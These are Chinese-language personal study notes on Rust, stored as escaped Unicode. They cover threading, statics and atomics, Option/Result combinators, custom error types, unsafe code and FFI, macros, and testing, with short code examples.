std::thread::spawn \u521b\u5efa\u7ebf\u7a0b \u7ebf\u7a0b\u5185\u90e8\u4ee3\u7801\u4f7f\u7528\u95ed\u5305\u6765\u6267\u884c main \u7ebf\u7a0b\u7ed3\u675f\u5219\u7a0b\u5e8f\u7acb\u5373\u7ed3\u675f\u4e0d\u4f1a\u7b49\u5230\u5b50\u7ebf\u7a0b\u5168\u90e8\u7ed3\u675f thread::sleep \u4f11\u7720\u5f53\u524d\u7ebf\u7a0b\u6307\u5b9a\u65f6\u95f4 use std :: thread ; use std :: time :: Duration ; fn main () { thread :: spawn ( || { for i in 1 .. 10 { println! ( \"hi number {} from the spawned thread!\" , i ); thread :: sleep ( Duration :: from_millis ( 1 )); } }); for i in 1 .. 5 { println! ( \"hi number {} from the main thread!\" , i ); thread :: sleep ( Duration :: from_millis ( 1 )); } } \u7b49\u5f85\u5b50\u7ebf\u7a0b\u7ed3\u675f spawn \u4f1a\u8fd4\u56de\u4e00\u4e2a JoinHandle<()> \u7c7b\u578b\u7684\u503c\uff0c\u53ef\u4ee5\u5728\u5176\u4e0a\u8c03\u7528 .join \u65b9\u6cd5\u6765\u963b\u585e\u5f53\u524d\u7ebf\u7a0b let handle = thread :: spawn ( .. .) handle . join (). unwrap (); \u7ebf\u7a0b\u95ed\u5305\u4e2d\u6355\u83b7\u53d8\u91cf \u521b\u5efa\u7ebf\u7a0b\u7684\u95ed\u5305\u4e2d\u4e0d\u80fd\u76f4\u63a5\u4f7f\u7528\u5f53\u524d\u7ebf\u7a0b\u4e2d\u7684\u53d8\u91cf\uff0c\u56e0\u4e3a\u65e0\u6cd5\u786e\u5b9a\u521b\u5efa\u7684\u65b0\u7ebf\u7a0b\u4f1a\u5b58\u6d3b\u591a\u4e45\uff0c\u53ef\u80fd\u5728\u501f\u7528\u53d8\u91cf\u521b\u5efa\u65b0\u7ebf\u7a0b\uff0c\u5728\u65b0\u7ebf\u7a0b\u8fd0\u884c\u65f6\uff0c\u501f\u7528\u7684\u539f\u503c\u5df2\u7ecf\u88ab drop \u56e0\u6b64\u4f7f\u7528\u6355\u83b7\u53d8\u91cf\u7684\u8bdd\u4e00\u5b9a\u8981\u5728\u53c2\u6570\u5217\u8868\u524d\u52a0\u4e0a move \u5173\u952e\u5b57\u6765\u5f3a\u5236\u8f6c\u79fb\u6240\u6709\u6743\uff08\u4e5f\u5c31\u662f\u8bf4\u5f53\u524d\u7ebf\u7a0b\u540e\u9762\u5c06\u4e0d\u53ef\u4ee5\u5728\u4f7f\u7528\u8fd9\u4e2a\u53d8\u91cf\uff09 barrier \u5728\u591a\u4e2a\u7ebf\u7a0b\u5185\u540c\u6b65\uff0c\u5373\u7b49\u5f85\u5404\u7ebf\u7a0b\u6267\u884c\u5230\u540c\u4e00\u4f4d\u7f6e\u540e\u518d\u7ee7\u7eed\u6267\u884c \u4f7f\u7528 std::sync::Barrier\uff0c\u9700\u8981\u901a\u8fc7 Arc \u6765\u5206\u914d\u5230\u5404\u4e2a\u7ebf\u7a0b\u4e2d \u8c03\u7528\u5176 .wait() \u65b9\u6cd5\u6765\u5bf9\u6240\u6709\u4f7f\u7528\u4e86 barrier \u5bf9\u7ebf\u7a0b\u8fdb\u884c\u540c\u6b65 use std :: sync :: { Arc , Barrier }; use std :: thread ; fn main () { let mut handles = Vec :: with_capacity ( 6 ); let barrier = Arc :: new ( Barrier :: new ( 6 )); for _ in 0 ..= 5 { let b = barrier . clone (); handles . push ( thread :: spawn ( move || { println! ( \"before wait\" ); b . wait (); println! ( \"after wait\" ); })) } for handle in handles { handle . join (). unwrap (); } } \u7ebf\u7a0b\u5c40\u90e8\u53d8\u91cf \u6807\u51c6\u5e93 thread_local \u5b8f \u901a\u8fc7\u5b8f\u6765\u521b\u5efa\u4e00\u4e2a\u751f\u547d\u5468\u671f\u4e3a 'static \u7684\u7ebf\u7a0b\u5c40\u90e8\u53d8\u91cf \u6bcf\u4e2a\u7ebf\u7a0b\u8bbf\u95ee\u65f6\u90fd\u4f1a\u4f7f\u7528\u5b83\u7684\u521d\u59cb\u503c\uff0c\u4e14\u5404\u7ebf\u7a0b\u95f4\u5f7c\u6b64\u4e0d\u5e72\u6270 \u7ebf\u7a0b\u5185\u90e8\u4f7f\u7528\u8fd9\u4e2a\u53d8\u91cf\u7684 with \u65b9\u6cd5\u6765\u83b7\u53d6\u503c\u8fdb\u884c\u64cd\u4f5c use std :: cell :: RefCell ; use std :: thread ; thread_local! ( static FOO : RefCell < u32 > = RefCell :: new ( 1 )); FOO . with ( | f | { .. . }) thread :: spawn ( move || { FOO . with ( | f | { .. . }) }). join (). unwrap (); \u7b2c\u4e09\u65b9\u5e93 thread-local TODO\uff1a\u6b47\u903c\u4e86\uff0c\u4ee5\u540e\u6709\u65f6\u95f4\u6709\u8010\u5fc3\u4e86\u518d\u770b\u591a\u7ebf\u7a0b \u5168\u5c40\u53d8\u91cf \u00b6 \u7f16\u8bd1\u671f\u521d\u59cb\u5316 \u9759\u6001\u5e38\u91cf \u4f7f\u7528 const \u5b9a\u4e49\uff0c\u5fc5\u987b\u6307\u5b9a\u7c7b\u578b\uff0c\u547d\u540d\u4e00\u822c\u5168\u5927\u5199 \u53ef\u4ee5\u5728\u4efb\u610f\u4f5c\u7528\u57df\u5b9a\u4e49\uff0c\u751f\u547d\u5468\u671f\u8d2f\u7a7f\u6574\u4e2a\u7a0b\u5e8f \u8d4b\u503c\u53ea\u80fd\u662f\u5728\u7f16\u8bd1\u671f\u5c31\u80fd\u8ba1\u7b97\u7684\u8868\u8fbe\u5f0f \u4e0d\u5141\u8bb8\u51fa\u73b0\u91cd\u590d\u5b9a\u4e49 \u9759\u6001\u53d8\u91cf \u4f7f\u7528 static \u5b9a\u4e49\uff0c\u5fc5\u987b\u6307\u5b9a\u7c7b\u578b\uff0c\u547d\u540d\u4e00\u822c\u5168\u5927\u5199 \u5fc5\u987b\u4f7f\u7528 unsafe \u8bed\u53e5\u5757\u624d\u80fd\u8bbf\u95ee\u548c\u4fee\u6539 static \u53d8\u91cf \u53ea\u6709\u5728\u540c\u4e00\u7ebf\u7a0b\u5185\u6216\u8005\u4e0d\u5728\u4e4e\u591a\u7ebf\u7a0b\u4e2d\u6570\u636e\u51c6\u786e\u6027\u65f6\u624d\u5e94\u8be5\u4f7f\u7528\u5168\u5c40\u9759\u6001\u53d8\u91cf \u8d4b\u503c\u53ea\u80fd\u662f\u5728\u7f16\u8bd1\u671f\u5c31\u80fd\u8ba1\u7b97\u7684\u8868\u8fbe\u5f0f \u9759\u6001\u53d8\u91cf\u4e0d\u4f1a\u88ab\u5185\u8054\uff0c\u4e14\u6574\u4e2a\u7a0b\u5e8f\u4e2d\u53ea\u6709\u4e00\u4e2a\u5b9e\u4f8b \u5b58\u50a8\u5728\u9759\u6001\u53d8\u91cf\u4e2d\u7684\u503c\u9700\u8981\u5b9e\u73b0 Sync trait \u539f\u5b50\u7c7b\u578b \u53ef\u4ee5\u4f5c\u4e3a\u5168\u5c40\u8ba1\u6570\u5668\uff0c\u4e14\u662f\u7ebf\u7a0b\u5b89\u5168\u7684 use std :: sync :: atomic :: { AtomicUsize . Ordering }; static VAR : AtomicUsize = AtomicUsize :: new ( 0 ); fn main () { for _ in 0 .. 100 { VAR . fetch_add ( 1 , Ordering :: Relaxed ); } } \u8fd0\u884c\u671f\u521d\u59cb\u5316 \u4f7f\u7528 lazy_static \u5305\u4e2d\u7684 lazy_static \u5b8f \u4f7f\u7528 Box::leak \u9519\u8bef\u5904\u7406 \u00b6 \u7ec4\u5408\u5668 .or() .and() \u5bf9\u4e24\u4e2a Option / Result \u8fdb\u884c\u7c7b\u4f3c\u5e03\u5c14\u7c7b\u578b\u7684\u64cd\u4f5c\u8fd4\u56de\u5176\u4e2d\u4e00\u4e2a\uff0c\u5982\uff1a None . or ( Some ( 1 )) // -> Some(1) Ok ( \"ok\" ). and ( Err ( \"err\" )) // -> Err(\"err\") .or_else() .and_then() \u7b2c\u4e8c\u4e2a\u8868\u8fbe\u5f0f\u662f\u4e00\u4e2a\u8fd4\u56de Option / Result \u7684\u95ed\u5305\uff0c\u5176\u4ed6\u548c or and \u7528\u6cd5\u4e00\u6837 .filter() \u53ef\u4ee5\u5bf9 Option \u8fdb\u884c\u8fc7\u6ee4 let s1 = Some ( 3 ); let s2 = Some ( 6 ); let n = None ; let fn_is_even = | x : & i8 | x % 2 == 0 ; assert_eq! ( s1 . filter ( fn_is_even ), n ); // Some(3) -> 3 is not even -> None assert_eq! ( s2 . filter ( fn_is_even ), s2 ); // Some(6) -> 6 is even -> Some(6) assert_eq! ( n . filter ( fn_is_even ), n ); // None -> no value -> None .map() .map_err() .map() \u6839\u636e\u95ed\u5305\u5c06 Some \u6216 Ok \u4e2d\u7684\u503c\u66f4\u6539\u4e3a\u53e6\u4e00\u4e2a Some ( \"...\" ). map ( | s : & str | s . chars (). count ()) // -> Some(3) .map_err() \u540c\u7406\uff0c\u662f\u5c06 Err \u4e2d\u7684\u503c\u66f4\u6539\u4e3a\u53e6\u4e00\u4e2a .map_or() .map_or_else() .map_or() \u5305\u542b\u4e24\u4e2a\u53c2\u6570\uff0c\u5f53\u8c03\u7528\u8005\u662f Ok / Some \u65f6\uff0c\u6267\u884c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u4e2d\u7684\u95ed\u5305\uff0c\u8fd4\u56de\u95ed\u5305\u7684\u8fd4\u56de\u503c\uff1b\u5f53\u8c03\u7528\u8005\u662f Err / None \u65f6\u8fd4\u56de\u7b2c\u4e00\u4e2a\u53c2\u6570\u4f5c\u4e3a\u9ed8\u8ba4\u503c .map_or_else() \u7c7b\u4f3c map_or\uff0c\u4e0d\u8fc7\u7b2c\u4e00\u4e2a\u53c2\u6570\u5373\u9ed8\u8ba4\u503c\u4e5f\u4f7f\u7528\u95ed\u5305\u6765\u63d0\u4f9b .ok_or() .ok_or_else() .ok_or() \u5c06 Option \u8f6c\u6362\u4e3a Result Some ( 1 ). ok_or ( \"...\" ) // -> Ok(1) None . ok_or ( \"...\" ) // -> Err(\"...\") .ok_or_else() \u7c7b\u4f3c\uff0c\u4f46\u53c2\u6570\u7531\u95ed\u5305\u6765\u63d0\u4f9b \u81ea\u5b9a\u4e49\u9519\u8bef\u7c7b\u578b std::error::Error trait \u5b9a\u4e49 use std :: fmt :: { Debug , Display }; pub trait Error : Debug + Display { fn source ( & self ) -> Option <& ( Error + ' static ) > { /* \u6709\u9ed8\u8ba4\u5b9e\u73b0 */ } } \u7531\u6b64\u53ef\u89c1\uff0c\u81ea\u5b9a\u4e49\u9519\u8bef\u7c7b\u578b\u53ea\u9700\u8981\u81ea\u52a8 derive Debug\uff0c\u7136\u540e\u624b\u52a8\u5b9e\u73b0\u4e00\u4e0b Display trait \u81ea\u5b9a\u4e49\u9519\u8bef\u7c7b\u578b use std :: fmt ; #[derive(Debug)] struct MyError ; impl fmt :: Display for MyError { fn fmt ( & self , f : & mut fmt :: Formatter ) -> fmt :: Result { write! ( f , \"my error\" ) } } fn func () -> Result < (), MyError > { Err ( MyError ) } \u9519\u8bef\u8f6c\u6362 From trait #[derive(Debug)] struct MyError { message : String , } impl std :: fmt :: Display for MyError { .. . } impl From < io :: Error > for MyError { fn from ( error : io :: Error ) -> Self { MyError { message : error . to_string (), } } } \u8fd9\u6837\u5b9e\u73b0\u4e86\u4e4b\u540e\u5c31\u53ef\u4ee5\u5728 ? \u7684\u65f6\u5019\u652f\u6301\u81ea\u52a8\u5c06 io::Error \u8f6c\u6362\u6210 MyError \u5f52\u4e00\u5316\u9519\u8bef\u7c7b\u578b \u4f8b\u5982\u5c06 std::env::VarError \u548c std::io::Error \u5f52\u4e00\u5316\u4e3a\u540c\u4e00\u79cd\u7c7b\u578b \u53ef\u4ee5\u4f7f\u7528\u7279\u5f81\u5bf9\u8c61 \u53ef\u4ee5\u81ea\u5b9a\u4e49 enum \u9519\u8bef\u7c7b\u578b\uff0c\u4f46\u662f\u4ee3\u7801\u8f83\u590d\u6742 \u53ef\u4ee5\u4f7f\u7528\u7b2c\u4e09\u65b9\u5305 thiserror \u6765\u7b80\u5316\u81ea\u5b9a\u4e49\u9519\u8bef\u7c7b\u578b\u96c6\u5408 #[derive(thiserror::Error, Debug)] enum MyError { #[error( \"Environment variable not found\" )] EnvironmentVariableNotFound ( #[from] std :: env :: VarError ), #[error(transparent)] IOError ( #[from] std :: io :: Error ), } \u53ef\u4ee5\u4f7f\u7528\u7b2c\u4e09\u65b9\u5305 anyhow \u4e2d\u7684 anyhow::Result<T>\uff0c\u4e0d\u5173\u5fc3\u9519\u8bef\u6d88\u606f unsafe \u00b6 unsafe \u4ee3\u7801\u5757\u6709\u4e94\u79cd\u80fd\u529b \u89e3\u5f15\u7528\u88f8\u6307\u9488 \u8c03\u7528\u4e00\u4e2a unsafe \u6216\u5916\u90e8\u7684\u51fd\u6570 \u8bbf\u95ee\u6216\u4fee\u6539\u4e00\u4e2a\u53ef\u53d8\u7684\u9759\u6001\u53d8\u91cf\uff08\u524d\u9762\u4ecb\u7ecd\u8fc7\u4e86\uff09 \u5b9e\u73b0\u4e00\u4e2a unsafe trait \u8bbf\u95ee union \u4e2d\u7684\u5b57\u6bb5 \u4f46 unsafe \u4ee3\u7801\u5757\u4ecd\u7136\u53d7 rust \u7684\u5b89\u5168\u652f\u6301\uff0c\u5b83\u5e76\u4e0d\u80fd\u7ed5\u8fc7 rust \u7684\u501f\u7528\u68c0\u67e5\uff0c\u4e5f\u4e0d\u80fd\u5173\u95ed\u4efb\u4f55 rust \u7684\u5b89\u5168\u68c0\u67e5 \u89e3\u5f15\u7528\u88f8\u6307\u9488 \u00b6 \u88f8\u6307\u9488 \u88f8\u6307\u9488\u4e0d\u9002\u7528 Rust \u7684\u501f\u7528\u89c4\u5219\uff0c\u540c\u65f6\u62e5\u6709\u4e00\u4e2a\u6570\u636e\u7684\u53ef\u53d8\u548c\u4e0d\u53ef\u53d8\u6307\u9488 \u88f8\u6307\u9488\u4e0d\u80fd\u4fdd\u8bc1\u6307\u5411\u5408\u6cd5\u7684\u5185\u5b58 \u88f8\u6307\u9488\u53ef\u4ee5\u662f null \u88f8\u6307\u9488\u6ca1\u6709\u5b9e\u73b0\u4efb\u4f55\u81ea\u52a8\u7684\u56de\u6536\uff08drop\uff09 \u88f8\u6307\u9488\u53ef\u4ee5\u4f7f\u7528\u52a0\u51cf\u6cd5\uff08\u5bf9\u5730\u5740\u64cd\u4f5c\uff09\uff0c\u4f46\u662f\u8fd9\u4e0d\u4f1a\u8003\u8651\u5355\u5143\u5927\u5c0f\uff0c\u5efa\u8bae\u5bf9\u88f8\u6307\u9488\u8c03\u7528 .add \u65b9\u6cd5\uff08\u4f1a\u81ea\u52a8\u4e58\u5355\u5143\u5927\u5c0f\uff09 \u521b\u5efa\u88f8\u6307\u9488 \u521b\u5efa\u88f8\u6307\u9488\u662f safe \u7684\uff0c\u4e0d\u9700\u8981\u5199\u5728 unsafe \u5757\u4e2d \u88f8\u6307\u9488\u6709\u4e24\u79cd\u5199\u6cd5\uff1a * const T \u548c * mut T \u5206\u522b\u8868\u793a T \u7c7b\u578b\u7684\u4e0d\u53ef\u53d8\u6307\u9488\u548c\u53ef\u53d8\u6307\u9488\uff08\u8fd9\u91cc\u7684 * \u4ec5\u4ec5\u662f\u8bb0\u53f7\uff0c\u4e0d\u8868\u793a\u89e3\u5f15\u7528\u7684\u542b\u4e49\uff09 \u57fa\u4e8e\u5f15\u7528\u521b\u5efa\u88f8\u6307\u9488 let mut num = 5 ; let r1 = & num as * const i32 ; let r2 = & mut num as * mut i32 ; \u57fa\u4e8e\u5185\u5b58\u5730\u5740\u521b\u5efa\u88f8\u6307\u9488 let address = 0x012345 usize ; let r = address as * const i32 ; \u76f8\u5f53\u5371\u9669\uff0c\u4f46\u521b\u5efa\u8fd9\u6837\u7684\u88f8\u6307\u9488\u4ecd\u7136\u662f safe \u7684\uff0c\u53ea\u8981\u4e0d\u89e3\u5f15\u7528 \u57fa\u4e8e\u667a\u80fd\u6307\u9488\u521b\u5efa\u88f8\u6307\u9488 let a : Box < i32 > = Box :: new ( 1 ); let b : * const i32 = &* a ; let c : * const i32 = Box :: into_raw ( a ) \u8c03\u7528\u65b9\u6cd5\u521b\u5efa\u88f8\u6307\u9488 \u4f8b\u5982 String \u7684 .as_ptr() \u548c .as_mut_ptr() \u65b9\u6cd5 \u89e3\u5f15\u7528\u88f8\u6307\u9488 \u5728 unsafe \u5757\u4e2d\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528 * \u5bf9\u88f8\u6307\u9488\u8fdb\u884c\u89e3\u5f15\u7528 \u8c03\u7528 unsafe \u6216\u5916\u90e8\u51fd\u6570 \u00b6 unsafe \u51fd\u6570 \u00b6 \u4f7f\u7528 unsafe fn \u5b9a\u4e49 \u4e0d\u80fd\u76f4\u63a5\u8c03\u7528\uff0c\u53ea\u80fd\u5728 unsafe \u5757\u4e2d\u8c03\u7528\uff0c\u5373\u8981\u786e\u4fdd\u8ba4\u8bc6\u5230\u4e86\u6b63\u5728\u8c03\u7528\u7684\u662f\u4e00\u4e2a\u4e0d\u5b89\u5168\u7684\u51fd\u6570 \u5305\u542b unsafe \u5757\u7684\u51fd\u6570\u4e0d\u5fc5\u90fd\u6807\u8bb0\u4e3a unsafe \u51fd\u6570\uff0c\u56e0\u4e3a\u6709\u4e9b\u51fd\u6570\u867d\u7136\u7528\u4e86 unsafe\uff0c\u4f46\u64cd\u4f5c\u5b9e\u9645\u4e0a\u662f\u5b8c\u5168\u5b89\u5168\u7684\uff08\u7f16\u8bd1\u5668\u4fdd\u5b88\u8ba4\u4e3a\u5176\u4e0d\u5b89\u5168\uff09 FFI \u00b6 \u5373 Foreign Function Interface\uff0c\u7528\u6765\u548c\u5176\u4ed6\u8bed\u8a00\u8fdb\u884c\u4ea4\u4e92 rust \u8c03\u7528 c \u9700\u8981\u5728 rust \u4ee3\u7801\u4e2d\u5199\u660e\u8981\u8c03\u7528\u7684\u51fd\u6570\u7b7e\u540d \u8c03\u7528\u5fc5\u987b\u5728 unsafe \u5757\u4e2d\u8fdb\u884c \u4f8b\u5982\u8c03\u7528 C \u6807\u51c6\u5e93\u4e2d\u7684 abs \u51fd\u6570 extern \"C\" { fn abs ( input : i32 ) -> i32 ; } fn main () { unsafe { println! ( \"abs(-1) = {}\" , abs ( - 1 )); } } c \u8c03\u7528 rust #[no_mangle] pub extern \"C\" fn call_from_c () { println! ( \"Call from C\" ); } \u4f7f\u7528 extern \u521b\u5efa\u4e00\u4e2a\u63a5\u53e3 #[no_mangle] \u544a\u8bc9\u7f16\u8bd1\u5668\u4e0d\u8981\u4fee\u9970\u51fd\u6570\u540d \u5b9e\u7528\u5de5\u5177 \u81ea\u52a8\u751f\u6210 FFI \u63a5\u53e3 \u751f\u6210 rust \u8c03\u7528 c \u7684\u4ee3\u7801\uff1a rust-lang/rust-bindgen \u4ece rust \u4ee3\u7801\u751f\u6210 c bindings\uff1a eqrion/cbindgen \u4e0e C++ \u4ee3\u7801\u4ea4\u4e92\uff08\u662f\u5b89\u5168\u7684\uff09\uff1a dtolnay/cxx \u5b9e\u73b0 unsafe trait \u00b6 \u81f3\u5c11\u6709\u4e00\u4e2a\u65b9\u6cd5\u5305\u542b\u7f16\u8bd1\u5668\u65e0\u6cd5\u9a8c\u8bc1\u7684\u5185\u5bb9\u7684 trait \u4f1a\u88ab\u6807\u4e3a unsafe \u5b9a\u4e49\u4f7f\u7528 unsafe trait \u5b9a\u4e49 \u5b9e\u73b0\u65b9\u6cd5\u4f7f\u7528 unsafe impl \u8bbf\u95ee union \u4e2d\u5b57\u6bb5 \u00b6 \u7c7b\u4f3c\u7ed3\u6784\u4f53\uff0c\u4f46\u6240\u6709\u5b57\u6bb5\u5171\u7528\u540c\u4e00\u4e2a\u5b58\u50a8\u7a7a\u95f4\uff0c\u5373\u5411\u4e00\u4e2a\u5b57\u6bb5\u4e2d\u5199\u5165\u503c\u56de\u8986\u76d6\u5176\u5b83\u5b57\u6bb5 #[repr(C)] union MyUnion { f1 : u32 , f2 : f32 , } \u8bbf\u95ee union \u5b57\u6bb5\u662f\u4e0d\u5b89\u5168\u7684\uff0c\u56e0\u4e3a rust \u65e0\u6cd5\u4fdd\u8bc1\u5f53\u524d\u5b58\u50a8\u5728 union \u5b9e\u4f8b\u4e2d\u7684\u6570\u636e\u7c7b\u578b\uff0c\u4f46\u5199\u5165\u662f\u5b89\u5168\u7684 macro \u5b8f\u7f16\u7a0b \u00b6 \u58f0\u660e\u5f0f\u5b8f \u00b6 \u4f7f\u7528 macro_rules! \u8fdb\u884c\u5b9a\u4e49\uff0c\u5339\u914d\u4ee3\u7801\u5e76\u751f\u6210\u4ee3\u7801 #[macro_export] macro_rules! myvec { ( $( $x : expr ), * ) => { { let mut tmp_vec = Vec :: new (); $( tmp_vec . push ( $x ); ) * tmp_vec } }; } \u5b8f\u540d\u79f0\u4e0d\u5fc5\u52a0 !\uff0c\u4f46\u8c03\u7528\u65f6\u9700\u8981\u52a0 #[macro_export] \u7528\u4e8e\u5bfc\u51fa\u5b8f\uff0c\u8ba9\u5176\u5b83\u5305\u53ef\u4ee5\u5f15\u5165\u4f7f\u7528 \u8fdb\u884c\u8f93\u5165\u4ee3\u7801\u7684\u6a21\u5f0f\u5339\u914d\uff0c\u4f7f\u7528 ( $( $x : expr ), * ) \u5339\u914d\u591a\u4e2a\u4ee5 , \u5206\u9694\u7684\u8868\u8fbe\u5f0f\uff0c\u6bcf\u4e2a\u8bb0\u4e3a $x \u4f9b\u540e\u9762\u4ee3\u7801\u4e2d\u4f7f\u7528\uff0c* \u4ee3\u8868\u524d\u9762\u7684\u6a21\u5f0f\u53ef\u4ee5\u51fa\u73b0\u4efb\u610f\u6b21\uff08\u5305\u62ec 0\uff09 => \u540e\u9762\u662f\u8981\u751f\u6210\u7684\u76ee\u6807\u4ee3\u7801 \u53ef\u4ee5\u4f7f\u7528 myvec ! [ 1 , 2 , 3 ] \u521b\u5efa Vec\uff0c\u4e5f\u53ef\u4ee5\u4f7f\u7528 myvec ! ( .. .) \u6216 myvec ! { .. .} \uff0c\u8fd9\u4e09\u8005\u7b49\u4ef7 \u8be6\u7ec6\u7528\u6cd5 TODO\uff1a https://veykril.github.io/tlborm/ \u8fc7\u7a0b\u5b8f \u00b6 \u8fc7\u7a0b\u5b8f\u7684\u5b9a\u4e49\u5fc5\u987b\u653e\u5165\u72ec\u7acb\u7684 lib crate \u4e2d \u81ea\u5b9a\u4e49 derive \u8fc7\u7a0b\u5b8f \u5728\u5f53\u524d crate \u6839\u76ee\u5f55\u4e0b\u521b\u5efa\u4e00\u4e2a\u65b0\u7684 lib crate \u7528\u4e8e\u7f16\u5199\u5b8f \u65b0\u7684 Cargo.toml \u4e2d\u9700\u8981\u6dfb\u52a0 [lib] proc-macro = true [dependencies] syn = \"1.0\" quote = \"1.0\" lib.rs extern crate proc_macro ; use proc_macro :: TokenStream ; use quote :: quote ; use syn ; #[proc_macro_derive(HelloMacro)] pub fn hello_macro_derive ( input : TokenStream ) -> TokenStream { // \u57fa\u4e8e input \u6784\u5efa AST \u8bed\u6cd5\u6811 let ast = syn :: parse ( input ). unwrap (); // \u6784\u5efa\u7279\u5f81\u5b9e\u73b0\u4ee3\u7801 impl_hello_macro ( & ast ) } impl_hello_macro \u51fd\u6570 fn impl_hello_macro ( ast : & syn :: DeriveInput ) -> TokenStream { let name = & ast . ident ; let gen = quote ! { impl HelloMacro for # name { fn hello_macro () { println! ( \"Hello, Macro! My name is {}!\" , stringify! ( # name )); } } }; gen . into () } \u8bfb\u53d6 ast\uff0c\u4f7f\u7528 quote \u751f\u6210\u4ee3\u7801\uff0c\u7136\u540e\u8c03\u7528 .into \u8f6c\u6362\u6210 TokenStream \u5bfc\u5165\u8fd9\u4e2a crate \u4e4b\u540e\u5c31\u53ef\u4ee5\u4f7f\u7528 #[derive(HelloMacro)] \u751f\u6210\u4ee3\u7801\u81ea\u52a8\u5b9e\u73b0 HelloMacro \u4e86 \u7c7b\u5c5e\u6027\u5b8f\uff08attribute-like macros\uff09 \u4f8b\u5982\u4fee\u9970\u4e00\u4e2a\u51fd\u6570\uff1a #[route(GET, \"/\" )] fn index () { .. . } \u4e5f\u9700\u8981\u4e00\u4e2a\u72ec\u7acb\u7684 crate \u6765\u5b9a\u4e49\uff0c\u5b9a\u4e49\u51fd\u6570\uff1a #[proc_macro_attribute] pub fn route ( attr : TokenStream , item : TokenStream ) -> TokenStream { .. . } attr \u662f\u5c5e\u6027\u5305\u542b\u7684\u5185\u5bb9\uff0c\u5982\u4e0a\u4f8b\u5b50\u4e2d\u7684 GET, \"/\" item \u662f\u6807\u6ce8\u7684\u9879\uff0c\u5982\u4e0a\u4f8b\u5b50\u4e2d\u7684 fn index() { ... } \u5373\u6574\u4e2a\u51fd\u6570\u4f53 \u7c7b\u51fd\u6570\u5b8f \u548c\u58f0\u660e\u5b8f\u7684\u4f7f\u7528\u65b9\u5f0f\u7c7b\u4f3c\uff0c\u4f46\u548c\u524d\u4e24\u79cd\u8fc7\u7a0b\u5b8f\u7684\u5b9a\u4e49\u65b9\u5f0f\u7c7b\u4f3c \u4f8b\u5982\u5982\u4e0b\u8c03\u7528\u89e3\u6790 SQL \u8bed\u53e5\uff1a let sql = sql ! ( SELECT * FROM posts WHERE id = 1 ); \u9700\u8981\u5bf9 SQL \u8bed\u53e5\u8fdb\u884c\u89e3\u6790\uff0cmacro_rules \u96be\u4ee5\u5b9e\u73b0 \u7c7b\u51fd\u6570\u5b8f\u5b9a\u4e49\u5f62\u5f0f\uff1a #[proc_macro] pub fn sql ( input : TokenStream ) -> TokenStream { .. . } TODO \u8fc7\u7a0b\u5b8f\uff1a https://github.com/dtolnay/proc-macro-workshop \u3001 https://blog.turbo.fish/ \u58f0\u660e\u5b8f\uff1a https://veykril.github.io/tlborm/ \u3001 https://zjp-cn.github.io/tlborm/ \u6d4b\u8bd5 \u00b6 \u65ad\u8a00 \u00b6 assert_eq! \u5b8f\u7528\u4e8e\u5224\u65ad\u4e24\u4e2a\u8868\u8fbe\u5f0f\u7684\u503c\u662f\u5426\u76f8\u7b49 \u4e0d\u76f8\u7b49\u5f53\u524d\u7ebf\u7a0b\u4f1a\u76f4\u63a5 panic \u53ef\u4ee5\u4ece\u7b2c\u4e09\u4e2a\u53c2\u6570\u5f00\u59cb\u8865\u5145\u683c\u5f0f\u5316\u8f93\u51fa\u989d\u5916\u4fe1\u606f assert_eq! ( a , b , \"\u989d\u5916\u4fe1\u606f\uff1aa = {}...\" , a ); assert_ne! \u5b8f\u7c7b\u4f3c\uff0c\u4e0d\u8fc7\u76f8\u7b49\u4f1a panic assert! \u5b8f\u7528\u4e8e\u5224\u65ad\u4f20\u5165\u7684\u5e03\u5c14\u8868\u8fbe\u5f0f\u662f\u5426\u4e3a true\uff0c\u4e3a false \u7684\u8bdd\u4f1a panic debug_assert_eq! debug_assert_ne! debug_assert! \u5b8f\u7528\u6cd5\u76f8\u540c\uff0c\u4f46\u662f\u53ea\u4f1a\u5728 Debug \u6a21\u5f0f\u4e0b\u8fd0\u884c\uff0c\u4f8b\u5982 cargo run --release \u5c31\u4e0d\u4f1a\u6267\u884c\u8fd9\u4e9b\u65ad\u8a00 \u7f16\u5199\u6d4b\u8bd5 \u00b6 rust \u53ea\u4f1a\u80fd lib crate \u8fdb\u884c\u6d4b\u8bd5\uff0c\u800c\u65e0\u6cd5\u5bf9 bin crate \u6d4b\u8bd5 \u5355\u5143\u6d4b\u8bd5 \u5b9a\u4e49\u4e00\u4e2a mod \u5e76\u6807\u8bb0\u4e3a test\uff1a #[cfg(test)] mod tests { #[test] fn test1 () { assert_eq! ( 2 + 2 , 4 ); } } panic \u4e86\u5219\u4e0d\u901a\u8fc7 \u5bf9\u4e8e\u6d4b\u8bd5\u51fd\u6570\u6dfb\u52a0\u4e00\u4e2a #[should_panic] \u53ef\u4ee5\u6807\u8bb0 panic \u4e3a\u671f\u671b\u7ed3\u679c\uff0c\u4e0d panic \u5219\u4e0d\u901a\u8fc7 \u53ef\u4ee5\u4f7f\u7528 expected \u53c2\u6570\u6765\u8868\u793a\u671f\u671b\u5f97\u5230\u7684 panic \u5b57\u7b26\u4e32 #[test] #[should_panic(expected= \"...\" )] fn test2 () { .. . } \u53ef\u4ee5\u4f7f\u7528 Result \u4f5c\u4e3a\u8fd4\u56de\u503c\uff0c\u8fd4\u56de Err \u5219\u4e0d\u901a\u8fc7\uff0c\u53ef\u4ee5\u8fd9\u6837\u6765\u5b9e\u73b0\u6d4b\u8bd5\u7684\u94fe\u5f0f\u8c03\u7528\uff0c\u4f46 #[should_panic] \u5728\u6b64\u65f6\u5c06\u4e0d\u53ef\u7528 \u4f7f\u7528 #[ignore] \u6765\u5ffd\u7565\u5f53\u524d\u6d4b\u8bd5 cargo test \u65f6\u4f20\u5165 --ignored \u53ef\u4ee5\u6267\u884c\u5ffd\u7565\u7684\u6d4b\u8bd5 \u96c6\u6210\u6d4b\u8bd5 tests \u76ee\u5f55\u7528\u6765\u4e13\u95e8\u5b58\u653e\u96c6\u6210\u6d4b\u8bd5\uff0ccargo \u4f1a\u4ece\u4e2d\u5bfb\u627e\u6d4b\u8bd5\u6587\u4ef6\uff0c\u5728\u6d4b\u8bd5\u65f6\u90fd\u4f1a\u8fd0\u884c \u6bcf\u4e2a\u6587\u4ef6\u5185\u90e8\u4e0d\u9700\u8981 #[cfg(test)] \u4ee5\u53ca\u4e0d\u9700\u8981\u521b\u5efa mod cargo test --test name \u6765\u4ec5\u6d4b\u8bd5 tests/name.rs \u6587\u4ef6 tests 